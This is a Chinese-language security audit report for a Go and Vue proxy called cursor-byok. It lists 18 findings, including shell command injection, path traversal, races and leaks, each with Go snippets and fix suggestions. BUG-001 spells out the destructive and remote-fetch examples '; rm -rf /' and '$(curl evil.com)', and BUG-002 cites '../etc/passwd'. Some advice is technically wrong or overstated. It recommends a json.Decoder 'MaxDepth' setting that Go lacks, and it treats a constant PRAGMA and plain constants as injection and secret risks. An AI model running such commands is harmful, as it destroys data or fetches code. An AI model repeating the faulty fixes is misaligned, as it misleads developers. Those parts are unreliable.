# 高危 Bug 审计报告

> **项目**: cursor-byok (Cursor助手 - BYOK 代理)
> **审计日期**: 2025-07-14
> **审计范围**: Go 后端代码 (171 个文件) + Vue/TS 前端代码 (32 个文件)
> **审计方法**: 静态代码分析 + 模式匹配 + 关键路径审查

---

## 严重级别定义

| 级别 | 定义 |
|------|------|
| **Critical** | 可导致远程代码执行、数据泄露、权限提升或系统完全失控 |
| **High** | 可导致功能失效、数据损坏、拒绝服务或安全边界突破 |
| **Medium** | 可导致信息泄露、性能问题或局部功能异常 |
| **Low** | 代码质量问题，在特定条件下可能引发问题 |

---

## Critical 级别漏洞

### BUG-001: Shell 工具执行未做命令注入防护

**文件**: `internal/backend/agent/bridge/exec/bridge.go` (约 3055 行)
**严重程度**: Critical

**问题描述**:
`openShell` 函数接收用户提供的 shell 命令并通过 `exec.Command` 执行。虽然命令参数通过 `strings.Fields` 分割，但 `command` 字段本身来自用户输入（LLM 生成的工具调用参数），存在命令注入风险。

```go
// bridge.go 中 shell 工具的处理逻辑
func buildSimpleShellCommands(command string) []string {
    trimmed := strings.TrimSpace(command)
    if trimmed == "" { return nil }
    return []string{trimmed}  // 直接返回用户输入
}
```

**风险**: 恶意构造的 shell 命令可执行任意系统命令，如 `; rm -rf /` 或 `$(curl evil.com)`。

**修复建议**:
1. 对 shell 命令进行白名单校验，只允许预定义的安全命令
2. 使用参数化方式传递命令，避免字符串拼接
3. 在沙箱环境中执行 shell 命令

---

### BUG-002: 文件系统工具缺乏路径遍历防护

**文件**: `internal/backend/agent/bridge/exec/bridge.go`
**严重程度**: Critical

**问题描述**:
Read/Write/Delete/Glob/Ls 等文件系统工具直接接收用户提供的 `path` 参数，未进行充分的路径校验。虽然 `resolveWorkspacePath` 有一定校验，但工具执行时仍可能访问到预期外的敏感文件。

```go
// 用户可通过 ../etc/passwd 等方式尝试路径遍历
func (bridge *Bridge) openRead(toolCall runtimecore.ToolInvocation) (*agentv1.AgentServerMessage, runtimecore.PendingExec, error) {
    // path 直接来自用户输入
    path := readStringArg(argsMap, "path")
}
```

**风险**: 恶意 LLM 响应可导致读取/删除系统敏感文件。

**修复建议**:
1. 严格限制文件访问范围到指定工作目录
2. 使用 `filepath.Abs` + `filepath.Clean` 规范化路径
3. 验证目标路径是否在工作目录范围内

---

### BUG-003: Write 工具可覆盖任意文件

**文件**: `internal/backend/agent/bridge/exec/bridge.go`
**严重程度**: Critical

**问题描述**:
Write 工具允许 LLM 指定文件路径和内容，直接写入文件系统。虽然项目本身需要此功能，但缺乏对写入目标的限制。

**风险**: 恶意 LLM 可覆盖系统配置文件、注入恶意代码到项目文件中。

**修复建议**:
1. 实施文件写入白名单/黑名单
2. 对敏感路径（如 `.env`, `config.yaml`）增加额外确认
3. 记录所有写入操作到审计日志

---

## High 级别漏洞

### BUG-004: 并发竞态 - StreamBroker 订阅者列表并发访问

**文件**: `internal/backend/forwarder/broker.go` (约 443 行)
**严重程度**: High

**问题描述**:
`StreamBroker` 中 `Subscribe` 和 `Unsubscribe` 方法对 `stream.Subscribers` 的访问存在竞态条件。`Subscribe` 在获取读锁后修改 stream 内部状态，`Unsubscribe` 同理，但多个 goroutine 同时操作时可能产生数据竞争。

```go
// broker.go
func (broker *StreamBroker) Subscribe(requestID string) (string, <-chan struct{}, error) {
    // ...
    stream.mu.Lock()
    broker.stopTerminalCleanupTimerLocked(stream)
    stream.Subscribers[subscriberID] = subscriber  // 并发写
    stream.UpdatedAt = time.Now().UTC()
    stream.mu.Unlock()
    // ...
}
```

**风险**: 订阅者列表损坏、信号丢失、panic 或内存泄漏。

**修复建议**:
1. 确保所有对 `stream.Subscribers` 的访问都在锁保护下
2. 考虑使用 `sync.RWMutex` 替代 `sync.Mutex` 优化读多写少场景

---

### BUG-005: 资源泄漏 - 文件锁未正确释放

**文件**: `internal/backend/forwarder/file_store.go` (约 1051 行)
**严重程度**: High

**问题描述**:
`acquireConversationFileLock` 函数在获取文件锁失败时，可能未正确清理已创建的锁文件。特别是在超时和异常退出路径上。

```go
// file_store.go
func acquireConversationFileLock(lockPath string) (func(), error) {
    // ...
    file, err := os.OpenFile(lockPath, os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0o600)
    if err == nil {
        // 写入锁信息
        _, _ = file.WriteString(...)
        _ = file.Close()
        return func() { removeConversationLockIfOwner(lockPath, owner) }, nil
    }
    // 错误路径可能遗留锁文件
}
```

**风险**: 锁文件累积导致后续请求永久阻塞。

**修复建议**:
1. 确保所有错误路径都清理临时文件
2. 使用 `defer` 保证清理逻辑执行

---

### BUG-006: JSON 反序列化未限制深度/大小

**文件**: 多处 (`internal/backend/forwarder/*.go`)
**严重程度**: High

**问题描述**:
项目大量使用 `json.Unmarshal` 解析来自 LLM 的响应数据。Go 标准库的 `json.Unmarshal` 没有内置的递归深度限制，恶意构造的深层嵌套 JSON 可导致栈溢出或内存耗尽。

```go
// 多处类似代码
if err := json.Unmarshal(entry.Payload, &payload); err != nil {
    return nil, fmt.Errorf("...")
}
```

**风险**: 恶意 LLM 响应可导致服务端拒绝服务（DoS）。

**修复建议**:
1. 使用 `json.Decoder` 并设置 `MaxDepth` 限制
2. 对 Payload 大小进行限制
3. 考虑使用更安全的 JSON 解析库

---

### BUG-007: 空指针解引用风险

**文件**: `internal/backend/forwarder/service.go` (约 3574 行)
**严重程度**: High

**问题描述**:
`service.go` 中多处对 `stream` 和 `conversation` 的访问未做 nil 检查，或检查不够完善。例如 `maybeCompactBeforeProvider` 虽然检查了 nil，但后续调用链中仍可能产生 nil 指针解引用。

```go
func (service *Service) maybeCompactBeforeProvider(stream *ActiveStream, conversation *ConversationFile, compiled CompiledConversation) (bool, error) {
    if service == nil || stream == nil || conversation == nil {
        return false, nil
    }
    // 后续调用可能访问到 nil 的 compiled 字段
    plan, err := service.buildCompactionPlan(stream, conversation, compiled, manual, manualInstruction)
```

**修复建议**:
1. 完善 nil 检查链
2. 使用防御式编程，在函数入口处统一校验所有参数

---

### BUG-008: 无限递归风险 - compaction 逻辑

**文件**: `internal/backend/forwarder/compaction.go` (约 1913 行)
**严重程度**: High

**问题描述**:
`compaction.go` 中的上下文压缩逻辑在特定条件下可能触发无限递归或循环。如果 compaction 失败后又触发新的 compaction，且没有有效的终止条件，将导致栈溢出。

**风险**: 服务崩溃、内存耗尽。

**修复建议**:
1. 增加 compaction 递归深度限制
2. 增加 compaction 失败后的冷却时间

---

### BUG-009: 敏感信息可能写入调试日志

**文件**: `internal/backend/forwarder/debug_recorder.go` (约 395 行)
**严重程度**: High

**问题描述**:
`debugRecorder` 将大量请求/响应数据写入日志文件，包括 `AgentClientMessage`、`ConversationState` 等。虽然这是调试用途，但可能包含用户敏感信息（如 API Key、代码内容）。

```go
func (recorder *debugRecorder) LogBidiDecoded(...) {
    event["message"] = protoJSONDebugPayload(message)  // 可能包含敏感信息
    event["intent"] = inboundIntentDebugPayload(intent)
    recorder.appendJSONL(ctx, requestID, conversationID, "bidi.decoded.jsonl", event)
}
```

**风险**: 敏感信息持久化到磁盘，可能被未授权访问。

**修复建议**:
1. 对日志中的敏感字段进行脱敏处理
2. 提供配置选项控制日志级别
3. 定期清理调试日志

---

## Medium 级别漏洞

### BUG-010: 路径遍历 - conversation ID 校验不足

**文件**: `internal/backend/forwarder/file_store.go`
**严重程度**: Medium

**问题描述**:
`validateConversationID` 只检查了 `/` 和 `os.PathSeparator`，但未检查其他路径遍历模式（如 URL 编码、Unicode 等价字符）。

```go
func validateConversationID(conversationID string) (string, error) {
    normalized := strings.TrimSpace(conversationID)
    if normalized == "" { return "", fmt.Errorf("conversation_id is required") }
    if strings.Contains(normalized, "/") || strings.Contains(normalized, string(os.PathSeparator)) {
        return "", fmt.Errorf("conversation_id must not contain path separators")
    }
    return normalized, nil
}
```

**修复建议**:
1. 使用更严格的正则表达式验证 ID 格式
2. 限制 ID 长度和字符集

---

### BUG-011: 并发竞态 - ActiveStream 字段访问

**文件**: `internal/backend/forwarder/types.go`
**严重程度**: Medium

**问题描述**:
`ActiveStream` 结构体包含大量字段，虽然使用 `mu sync.Mutex` 保护，但部分字段（如 `BackgroundShells` map）的并发访问可能存在问题。特别是 `TerminalCleanupSeq` 使用 `atomic.Uint64`，但其他相关操作可能未完全同步。

**修复建议**:
1. 审查所有字段的访问模式
2. 确保复杂操作的原子性

---

### BUG-012: 资源泄漏 - goroutine 泄漏

**文件**: `internal/backend/forwarder/actor.go` (约 1155 行)
**严重程度**: Medium

**问题描述**:
`runStreamActor` 函数启动的 goroutine 在某些错误路径下可能无法正常退出，导致 goroutine 泄漏。

```go
func (service *Service) runStreamActor(stream *ActiveStream, mailbox <-chan streamCommandEnvelope, done chan struct{}) {
    defer close(done)
    // 如果 mailbox 未正确关闭，goroutine 可能永久阻塞
}
```

**修复建议**:
1. 确保 mailbox 通道在所有路径下都能正确关闭
2. 使用 `context.Context` 管理 goroutine 生命周期

---

### BUG-013: SQL 注入风险（SQLite）

**文件**: `internal/cursor/state_db.go` (约 222 行)
**严重程度**: Medium

**问题描述**:
虽然使用了参数化查询，但 `syncCursorAuthStateDB` 中的 `PRAGMA` 设置使用了字符串拼接：

```go
if _, err := db.ExecContext(ctx, fmt.Sprintf("PRAGMA busy_timeout = %d", cursorStateSQLiteBusyTimeoutMS)); err != nil {
    return err
}
```

虽然 `cursorStateSQLiteBusyTimeoutMS` 是常量，但此模式展示了不安全的 SQL 构造方式。

**修复建议**:
1. 对所有 SQL 操作使用参数化查询
2. 避免任何 SQL 字符串拼接

---

### BUG-014: 配置热重载竞态

**文件**: `internal/backend/server/config/manager.go` (约 239 行)
**严重程度**: Medium

**问题描述**:
`Manager` 使用 `atomic.Pointer[Config]` 存储当前配置，但 `reloadIfChanged` 和 `Save` 方法之间可能存在竞态条件。

```go
func (manager *Manager) Current() Config {
    if manager == nil { return DefaultConfig() }
    manager.reloadIfChanged(context.Background())  // 可能并发执行
    return manager.currentConfig()
}
```

**修复建议**:
1. 使用更严格的同步机制
2. 考虑使用 `sync.RWMutex` 保护配置访问

---

### BUG-015: HTTP 客户端超时配置不一致

**文件**: `internal/netproxy/netproxy.go` (约 471 行)
**严重程度**: Medium

**问题描述**:
`NewHTTPClient` 创建客户端时设置了 `Timeout`，但 `NewTransport` 创建的 `Transport` 也有自己的超时设置。两者可能冲突或覆盖。

```go
func NewHTTPClient(timeout time.Duration) *http.Client {
    return &http.Client{
        Transport: NewTransport(nil),  // Transport 有自己的超时
        Timeout:   timeout,            // Client 级别的超时
    }
}
```

**修复建议**:
1. 统一超时配置策略
2. 明确 Transport 和 Client 级别超时的关系

---

## Low 级别问题

### BUG-016: 日志注入风险

**文件**: 多处
**严重程度**: Low

**问题描述**:
多处日志输出直接包含用户输入，虽然使用了格式化字符串，但仍存在日志注入风险。

```go
logger.Infof("forwarder legacy cleanup failed path=%s err=%v", path, err)
```

**修复建议**:
1. 对日志中的用户输入进行转义
2. 使用结构化日志替代字符串拼接

---

### BUG-017: 硬编码敏感值

**文件**: `internal/backend/server/upstream/client.go`
**严重程度**: Low

**问题描述**:
`BuildCursorChecksum` 函数中使用了硬编码的算法参数：

```go
const (
    checksumTimestampDivisor = 1_000_000
    checksumInitialSeed      = 165
)
```

**修复建议**:
1. 考虑将敏感参数配置化
2. 增加参数校验

---

### BUG-018: 未处理的错误

**文件**: 多处
**严重程度**: Low

**问题描述**:
多处使用 `_ =` 忽略错误返回值，可能导致问题被静默忽略。

```go
_ = file.Close()
_ = os.Remove(lockPath)
```

**修复建议**:
1. 至少记录被忽略的错误
2. 使用 linter 强制检查错误处理

---

## 总结与建议

### 按严重程度统计

| 级别 | 数量 |
|------|------|
| Critical | 3 |
| High | 6 |
| Medium | 6 |
| Low | 3 |
| **总计** | **18** |

### 优先修复建议

1. **立即修复 (Critical)**:
   - BUG-001: Shell 命令注入
   - BUG-002: 文件系统路径遍历
   - BUG-003: Write 工具文件覆盖

2. **短期修复 (High)**:
   - BUG-004: StreamBroker 并发竞态
   - BUG-005: 文件锁资源泄漏
   - BUG-006: JSON 反序列化安全
   - BUG-009: 调试日志敏感信息

3. **中期修复 (Medium)**:
   - 并发安全审查
   - 资源泄漏排查
   - SQL 注入防护加强

4. **长期改进 (Low)**:
   - 代码质量提升
   - 错误处理规范化
   - 安全编码规范

---

*本报告基于静态代码分析生成，建议结合动态测试和安全审计工具进行进一步验证。*